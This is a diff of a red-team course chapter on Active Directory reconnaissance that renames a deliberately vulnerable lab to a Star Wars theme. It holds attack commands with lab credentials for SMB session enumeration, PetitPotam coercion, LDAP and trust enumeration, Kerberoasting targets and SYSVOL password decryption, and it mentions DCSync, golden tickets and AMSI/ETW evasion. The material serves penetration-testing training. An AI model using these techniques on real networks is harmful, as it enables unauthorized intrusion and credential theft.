+Returns the list of SMB sessions to each host — i.e., who is *connected* (typically anyone running `\\scarif\share`). Default ACL since Server 2016 restricts this to local admins / Administrators, but legacy hosts permit it for Authenticated Users.
 
 ### NetWkstaUserEnum (users logged in on this host)
 
 ```bash
-nxc smb 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!' --loggedon-users
+nxc smb 10.10.0.0/21 -u peter.parker -p 'EmpireLab2024!' --loggedon-users
 ```
 
 Stricter ACL (admin-only by default). When it works, it tells you who is *actually interactively logged on*.
@@ -1078,8 +1078,8 @@ Key UUIDs to watch for:
 
 ```bash
 # EFSRPC (PetitPotam)
-Coercer.py coerce -t 10.10.0.10 -u peter.parker -p 'DVADlab2024!' -d corp.local
-Coercer.py scan -t 10.10.0.10 -u peter.parker -p 'DVADlab2024!' -d corp.local
+Coercer.py coerce -t 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' -d empire.local
+Coercer.py scan -t 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' -d empire.local
 
 # Spoolss
 rpcdump.py @10.10.0.10 | grep -i spoolss
@@ -1099,7 +1099,7 @@ Before you escalate, exhaustively read your own user object:
 $LDAP "(sAMAccountName=peter.parker)" "*" "+"
 
 # Your token's effective SIDs
-nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --query \
+nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --query \
     "(sAMAccountName=peter.parker)" "memberOf objectSid tokenGroups"
 ```
 
@@ -1107,7 +1107,7 @@ Then probe for write rights:
 
 ```bash
 # bloodyAD — list ACEs on objects you might own
-bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
+bloodyAD -d empire.local -u peter.parker -p 'EmpireLab2024!' --host 10.10.0.10 \
          get writable
 ```
 
@@ -1133,18 +1133,18 @@ klist                # current Kerberos tickets
 The Public Key Services container holds every CA, template, NTAuthCertificate, and AIA / CRL pointer:
 
 ```bash
-$LDAP -b "CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" \
+$LDAP -b "CN=Public Key Services,CN=Services,CN=Configuration,DC=empire,DC=local" \
       "(objectClass=*)" cn distinguishedName
 
 # Templates
-$LDAP -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" \
+$LDAP -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=empire,DC=local" \
       "(objectClass=pKICertificateTemplate)" \
       cn displayName msPKI-Certificate-Name-Flag msPKI-Enrollment-Flag \
       msPKI-RA-Signature msPKI-Certificate-Application-Policy \
       pKIExtendedKeyUsage flags
 
 # NTAuthCertificates — who can sign client-auth certs
-$LDAP -b "CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" \
+$LDAP -b "CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=empire,DC=local" \
       "(objectClass=*)" caCertificate cACertificateDN
 ```
 
@@ -1160,18 +1160,18 @@ The GC (port 3268) holds a partial replica of every object in every domain of th
 
 ```bash
 # Global Catalog bind
-ldapsearch -x -H ldap://10.10.0.10:3268 -D 'peter.parker@corp.local' -w 'DVADlab2024!' \
+ldapsearch -x -H ldap://10.10.0.10:3268 -D 'peter.parker@empire.local' -w 'EmpireLab2024!' \
            -b "" -s sub "(objectCategory=person)" sAMAccountName
 
-# Lists every user in EVERY domain of corp.local forest (corp.local + root.corp if same forest)
+# Lists every user in EVERY domain of empire.local forest (empire.local + trade.corp if same forest)
 ```
 
-Note: an **external trust** to finance.local means finance.local is **not** in the corp.local forest — GC will not see those objects. You need to query 10.20.0.10 directly.
+Note: an **external trust** to rebel.local means rebel.local is **not** in the empire.local forest — GC will not see those objects. You need to query 10.20.0.10 directly.
 
 ```bash
-ldapsearch -x -H ldap://10.30.0.10:3268 -D 'peter.parker@corp.local' -w 'DVADlab2024!' \
+ldapsearch -x -H ldap://10.30.0.10:3268 -D 'peter.parker@empire.local' -w 'EmpireLab2024!' \
            -b "" -s sub "(objectCategory=person)" sAMAccountName
-# This queries the root.corp GC — assuming forest trust, you can authenticate cross-forest
+# This queries the trade.corp GC — assuming forest trust, you can authenticate cross-forest
 ```
 
 [Flag: ENUM-074 — Global Catalog walk]
@@ -1186,7 +1186,7 @@ Most "scary" privileges hide on service accounts: short names, no description, a
 
 ```bash
 # Accounts with SPN AND in a privileged group
-$LDAP "(&(servicePrincipalName=*)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local))" \
+$LDAP "(&(servicePrincipalName=*)(memberOf=CN=Domain Admins,CN=Users,DC=empire,DC=local))" \
       sAMAccountName servicePrincipalName
 
 # Accounts whose pwdLastSet is older than 1 year (stale → likely service account)
@@ -1203,7 +1203,7 @@ $LDAP "(userAccountControl:1.2.840.113556.1.4.803:=65536)" sAMAccountName
 $LDAP "(userAccountControl:1.2.840.113556.1.4.803:=32)" sAMAccountName
 ```
 
-DVAD's `svc_jarvis`, `svc_vision`, `svc_backup`, `svc_jenkins` all carry intentionally weak passwords matching common wordlists like `rockyou.txt`. Kerberoasting them yields easy DA chains.
+EMPIRE's `svc_jarvis`, `svc_vision`, `svc_r2d2`, `svc_jenkins` all carry intentionally weak passwords matching common wordlists like `rockyou.txt`. Kerberoasting them yields easy DA chains.
 
 [Flag: ENUM-022 — service-acct catalogue]
 
@@ -1241,24 +1241,24 @@ Each privileged group has a particular escalation primitive (see chapter 11):
 
 ## 8.20 Layer 16 — Cross-tier visibility
 
-A practical recon trick: cross-reference findings across domains *without* explicit pivoting. If `peter.parker@corp.local` has a trust path into finance.local, you can sometimes read finance.local objects from a corp-side query via the global catalog — even before pivoting laterally.
+A practical recon trick: cross-reference findings across domains *without* explicit pivoting. If `peter.parker@empire.local` has a trust path into rebel.local, you can sometimes read rebel.local objects from a corp-side query via the global catalog — even before pivoting laterally.
 
 ```bash
-# Hit finance.local's DC with corp creds (external trust permits it)
-ldapsearch -x -H ldap://10.20.0.10 -D 'peter.parker@corp.local' -w 'DVADlab2024!' \
-           -b 'DC=finance,DC=local' "(objectCategory=person)" sAMAccountName
+# Hit rebel.local's DC with corp creds (external trust permits it)
+ldapsearch -x -H ldap://10.20.0.10 -D 'peter.parker@empire.local' -w 'EmpireLab2024!' \
+           -b 'DC=rebel,DC=local' "(objectCategory=person)" sAMAccountName
 
 # If the trust is "shortcut" / forest with selective auth → may be filtered
 ```
 
-Sometimes finance.local strips trust permissions to specific groups. Test access object-by-object.
+Sometimes rebel.local strips trust permissions to specific groups. Test access object-by-object.
 
 ---
 
 ## 8.21 The recon master output layout
 
 ```
-~/dvad/recon/
+~/empire/recon/
 ├── 00-osint/
 │   └── employee-names.txt
 ├── 01-network/
@@ -1310,9 +1310,9 @@ Sometimes finance.local strips trust permissions to specific groups. Test access
 │       ├── Groups.xml
 │       └── unattend.xml
 ├── 08-mssql/
-│   ├── sql01-version.txt
-│   ├── sql01-databases.txt
-│   └── sql01-linked-servers.txt
+│   ├── kamino-version.txt
+│   ├── kamino-databases.txt
+│   └── kamino-linked-servers.txt
 ├── 09-gpo-sysvol/
 │   ├── sysvol-tree.txt
 │   ├── gpp-decrypted.txt
@@ -1325,7 +1325,7 @@ Sometimes finance.local strips trust permissions to specific groups. Test access
 │   ├── nxc-loggedon.txt
 │   └── userhunter-da.txt
 ├── 12-rpc/
-│   └── rpcdump-dc01.txt
+│   └── rpcdump-coruscant.txt
 ├── 13-acl/
 │   ├── bloodyad-writable-peter.parker.txt
 │   └── adacl-tony.stark.txt
@@ -1350,7 +1350,7 @@ After the sweep, write `99-summary/pivot-plan.md`:
 # Pivot plan — 2026-05-21
 
 ## What I have
-- peter.parker : DVADlab2024! (low-priv user)
+- peter.parker : EmpireLab2024! (low-priv user)
 - BloodHound DB merged: corp, finance, root.
 - Vulnerable templates: VulnerableESC1 (corp), Web-RA (finance ESC8 candidate).
 
@@ -1359,7 +1359,7 @@ After the sweep, write `99-summary/pivot-plan.md`:
 1. **Kerberoast svc_jarvis** — RC4, weak password.
    - Cost: 1 TGS-REQ.
    - Risk: 4769 RC4 alert if SIEM is tight.
-   - Payoff: svc_jarvis likely sysadmin on sql01 → xp_cmdshell → SYSTEM.
+   - Payoff: svc_jarvis likely sysadmin on kamino → xp_cmdshell → SYSTEM.
 
 2. **AS-REP roast svc_legacy** — DontReqPreAuth set.
    - Cost: 1 AS-REQ.
@@ -1385,7 +1385,7 @@ Treat this as a living document. Each successful step changes the plan.
 
 ## 8.23 Stealth knobs
 
-If your engagement budget allows aggressive recon (e.g., DVAD lab, no SOC), skip this. Otherwise:
+If your engagement budget allows aggressive recon (e.g., EMPIRE lab, no SOC), skip this. Otherwise:
 
 | Knob | Quiet | Loud |
 |------|-------|------|
@@ -1398,7 +1398,7 @@ If your engagement budget allows aggressive recon (e.g., DVAD lab, no SOC), skip
 | Coercion probe | rpcdump endpoint walk | Actual MS-EFSR call |
 | Defender DNS | `nslookup` with short TTL | Live AXFR / mass PTR sweep |
 
-DVAD does not run Defender for Identity. On a real engagement, MDI will alert on:
+EMPIRE does not run Defender for Identity. On a real engagement, MDI will alert on:
 
 - Mass LDAP enum (anomaly detection).
 - SMB session enumeration from non-admin.
@@ -1411,29 +1411,29 @@ Pace your enum to one query per ~5 seconds on hot targets.
 
 ## Lab exercises
 
-### Exercise 8.A — Run the full sweep on DVAD
+### Exercise 8.A — Run the full sweep on EMPIRE
 
-For each layer 1–16, generate the recon output and save under `~/dvad/recon/<layer>/`. Compare against `PLAN.md` to count enumeration flags captured. Aim for ≥ 70/80 ENUM-* flags from this single pass.
+For each layer 1–16, generate the recon output and save under `~/empire/recon/<layer>/`. Compare against `PLAN.md` to count enumeration flags captured. Aim for ≥ 70/80 ENUM-* flags from this single pass.
 
 ### Exercise 8.B — Plan an attack path with BloodHound
 
 After loading BloodHound (BHCE):
 
-1. Find shortest path from a standard user like `peter.parker@corp.local` to `Administrator@corp.local`.
+1. Find shortest path from a standard user like `peter.parker@empire.local` to `Administrator@empire.local`.
 2. Look at the specific ACEs granted to non-admin users in the environment (as seen in BloodHound output). Note these explicitly:
    - `peter.parker` has `GenericAll` over `tony.stark`
    - `developer1` has `ForceChangePassword` on `nick.fury`
    - `nick.fury` has `WriteSPN` on `svc_vision` (Kerberoasting pivot)
    - `nick.fury` has `WriteOwner` on `Domain Admins`
    - `qa_user` has `AddSelf` to `Avengers Admins`
-   - `loki` has `GenericAll` on `FILE01$` and `SQL01$`
+   - `loki` has `GenericAll` on `scarif$` and `kamino$`
    - `steve.rogers` has `GenericAll` on `AdminSDHolder` (Persistence mechanism)
 3. Identify each edge type along the path. Construct a chained sequence (e.g., `developer1` → ForceChangePassword → `nick.fury` → WriteOwner → `Domain Admins`).
-4. For each edge, list the technique that exploits it (e.g., "GenericWrite on user → set SPN → Kerberoast"). Keep the list under `~/dvad/recon/99-summary/path-1.md`.
+4. For each edge, list the technique that exploits it (e.g., "GenericWrite on user → set SPN → Kerberoast"). Keep the list under `~/empire/recon/99-summary/path-1.md`.
 
 ### Exercise 8.C — Cross-forest map
 
-Run BloodHound collection against corp.local, finance.local, and root.corp using `peter.parker@corp.local`. Merge all three zips into the same BHCE instance. Identify:
+Run BloodHound collection against empire.local, rebel.local, and trade.corp using `peter.parker@empire.local`. Merge all three zips into the same BHCE instance. Identify:
 
 - ForeignSecurityPrincipals entries that link corp ↔ finance.
 - ForeignSecurityPrincipals entries that link corp ↔ root.
@@ -1445,7 +1445,7 @@ Pick five claims BloodHound makes (e.g., "tony.stark has GenericAll on bruce.ban
 
 ### Exercise 8.E — Kerbrute without creds
 
-Generate a name-based username list from `employees.txt` (firstname.lastname, fnlast, etc.). Run `kerbrute userenum` against corp.local with **no credentials**. Compare the resulting hits to the ldapsearch user list.
+Generate a name-based username list from `employees.txt` (firstname.lastname, fnlast, etc.). Run `kerbrute userenum` against empire.local with **no credentials**. Compare the resulting hits to the ldapsearch user list.
 
 ### Exercise 8.F — ADCS template audit
 
@@ -1456,19 +1456,19 @@ Run `certipy find` against each forest. For every template with an ESC tag, reco
 - Enrollment principals.
 - Whether your current user can enroll.
 
-Save to `~/dvad/recon/06-adcs/template-audit.md`.
+Save to `~/empire/recon/06-adcs/template-audit.md`.
 
 ### Exercise 8.G — Trust-attributes interpretation
 
-For each of the four DVAD trusts (corp↔eu, corp→finance, corp↔root, etc.), decode the `trustAttributes` bitmask byte-by-byte. Document which bits would have to flip to make a SID-history forest-jump attack fail.
+For each of the four EMPIRE trusts (corp↔eu, corp→finance, corp↔root, etc.), decode the `trustAttributes` bitmask byte-by-byte. Document which bits would have to flip to make a SID-history forest-jump attack fail.
 
 ### Exercise 8.H — Session-hunt for DAs
 
-From the lab's `peter.parker` account, run `Invoke-UserHunter -GroupName "Domain Admins"`. If no hits, lab the DC up: `mstsc /v:dc01.corp.local` (admin password), log in, log out — then re-run the UserHunter from peter.parker. The session should now appear. Discuss how this informs lateral targeting.
+From the lab's `peter.parker` account, run `Invoke-UserHunter -GroupName "Domain Admins"`. If no hits, lab the DC up: `mstsc /v:coruscant.empire.local` (admin password), log in, log out — then re-run the UserHunter from peter.parker. The session should now appear. Discuss how this informs lateral targeting.
 
 ### Exercise 8.I — SYSVOL trawl
 
-Pull SYSVOL from corp.local and finance.local. Find:
+Pull SYSVOL from empire.local and rebel.local. Find:
 
 - All `cpassword` instances. Decrypt them.
 - All `.ps1` / `.bat` files referencing `password` / `cred` / `runas`.
@@ -1525,3 +1525,85 @@ This document is the deliverable a real red team would hand to the customer.
 - **certipy README** — flag-for-flag mapping to ESC vulnerabilities.
 
 Next: [09-initial-access.md](09-initial-access.md).
+
+---
+
+# The EMPIRE AD Lab: Star Wars Lore & Thematic Mapping
+
+Welcome to the **EMPIRE AD Lab**, where the intricacies of Active Directory align with the galactic struggle between the Galactic Empire, the Rebel Alliance, and the shadow syndicates. This section provides a conceptual thematic mapping between the AD concepts you are attacking and the Star Wars universe.
+
+## The Galactic Topology
+
+The lab topology represents the political structure of the galaxy. Just as trust relationships govern AD, diplomatic and military alliances govern the galaxy.
+
+```mermaid
+graph TD
+    classDef empire fill:#000000,stroke:#ff0000,stroke-width:2px,color:#fff;
+    classDef rebel fill:#2b5c8f,stroke:#ff9900,stroke-width:2px,color:#fff;
+    classDef trade fill:#4a4a4a,stroke:#aaaaaa,stroke-width:2px,color:#fff;
+    classDef highlight fill:#440000,stroke:#ff0000,stroke-width:3px,color:#fff;
+
+    subgraph The Galactic Empire (empire.local)
+        Coruscant["Coruscant (Root DC)<br/>coruscant.empire.local"]:::empire
+        DeathStar["The Death Star (Child DC)<br/>deathstar.eu.empire.local"]:::highlight
+        Scarif["Scarif Citadel (File Server)<br/>scarif.empire.local"]:::empire
+        Kamino["Kamino Cloning Facility (SQL)<br/>kamino.empire.local"]:::empire
+        Endor["Endor Shield Generator (CA)<br/>endor.empire.local"]:::empire
+        Mandalore["Mandalore Mercenary Base (Linux)<br/>mandalore.empire.local"]:::empire
+        Coruscant -- "Imperial Command" --> DeathStar
+        Coruscant --- Scarif
+        Coruscant --- Kamino
+        Coruscant --- Endor
+        Coruscant --- Mandalore
+    end
+
+    subgraph The Rebel Alliance (rebel.local)
+        Yavin4["Yavin 4 Base<br/>yavin4.rebel.local"]:::rebel
+    end
+
+    subgraph The Trade Federation (trade.corp)
+        Neimoidia["Cato Neimoidia<br/>neimoidia.trade.corp"]:::trade
+    end
+
+    Coruscant <-->|Espionage / External Trust| Yavin4
+    Coruscant <-->|Treaty / Forest Trust| Neimoidia
+```
+
+## Infrastructure Mapping
+
+Understanding the infrastructure is key to successfully executing your attack paths. Here is how the technical components of the EMPIRE AD lab map to the Star Wars universe:
+
+### 1. The Core Domains
+* **`empire.local` (The Galactic Empire):** The central root domain. This is the seat of the Emperor and the Imperial Senate. Taking over this domain is equivalent to taking over Coruscant. It controls all the core infrastructure.
+* **`eu.empire.local` (The Death Star):** A child domain of `empire.local`. While it reports to the root domain, it holds immense power. Escaping the child domain to compromise the root domain is the equivalent of using the Death Star plans to destroy the Empire.
+* **`rebel.local` (The Rebel Alliance):** An external forest. It has an external trust with the Empire (perhaps through espionage or captured spies). Moving laterally across this trust requires finding a weak link in the Rebel defenses.
+* **`trade.corp` (The Trade Federation):** A separate forest with a bidirectional forest trust. The Empire uses them for resources, but you can forge trust tickets (Inter-Realm TGTs) to cross this boundary.
+
+### 2. High-Value Targets (Servers)
+* **`coruscant.empire.local` (Coruscant Root DC):** The ultimate prize. Achieving Domain Admin here gives you the keys to the galaxy.
+* **`endor.empire.local` (Endor Shield Generator / ADCS):** Active Directory Certificate Services. If you can compromise the CA (via ESC1, ESC8, etc.), you can forge certificates for any user in the Empire, effectively bringing down the deflector shields.
+* **`scarif.empire.local` (Scarif Citadel):** This file server hosts critical SMB shares. It is the repository of the Death Star plans. Look for exposed passwords in scripts or configuration files left by careless Imperial engineers.
+* **`kamino.empire.local` (Kamino Facility):** The SQL Server. SQL injection or xp_cmdshell here can lead to a foothold. It represents the cloning facilities—a hidden source of power.
+* **`mandalore.empire.local` (Mandalore Base):** The Linux-in-AD member. Contains local privilege escalations and cross-OS pivot opportunities. Represents the mercenary faction employed by the Empire.
+
+### 3. Attack Paths and Tactics
+* **Initial Access (The Smuggler's Route):** Finding an exposed SMB share or exploiting an LLMNR poisoning vulnerability (Responder) is like slipping past the Imperial blockade.
+* **Kerberoasting (Bounty Hunting):** Requesting TGS tickets for service accounts and cracking them offline is like putting a bounty on a high-value target and cracking their encryption.
+* **DCSync (The Force):** Using `secretsdump` to pull the `krbtgt` hash directly from the Domain Controller. It's an invisible, powerful attack that bypasses normal defenses.
+* **Golden Ticket (Order 66):** Once you have the `krbtgt` hash, you can forge a TGT for any user, granting you infinite access. It is the ultimate executive order, overriding all security protocols.
+* **Trust Abuse (Diplomatic Immunity):** Forging a trust ticket to cross from the Child Domain to the Root Domain.
+
+## The Hacker's Code (Sith vs Jedi)
+As you navigate the lab, remember that the tools you use define your path. Will you use noisy, aggressive tools (The Dark Side) that trigger every alarm, or will you use stealthy, precise tradecraft (The Light Side) to move undetected?
+
+* **The Dark Side (Noisy):** Running `BloodHound` with all collection methods, spraying passwords across the entire domain, and dropping standard Mimikatz binaries to disk. It is powerful and fast, but leaves a massive trail.
+* **The Light Side (Stealthy):** Targeted LDAP queries, memory-only execution via Covenant or Cobalt Strike, and careful evasion of logging (AMSI bypasses, ETW patching).
+
+## Flag Locations (Holocrons)
+Hidden throughout the EMPIRE AD lab are flags (Holocrons) that prove your mastery over the environment. Look for `FLAG-*.txt` files on desktops, hidden SMB shares, and within the SQL databases. 
+
+**Remember:** 
+* "Your focus determines your reality." - Qui-Gon Jinn. Focus on the attack paths mapped out in `PLAN.md`.
+* "I find your lack of faith disturbing." - Darth Vader. If an exploit fails, check your syntax, your targeting, and the underlying misconfiguration. The lab is intentionally vulnerable.
+
+May the Force be with you as you conquer the EMPIRE AD!
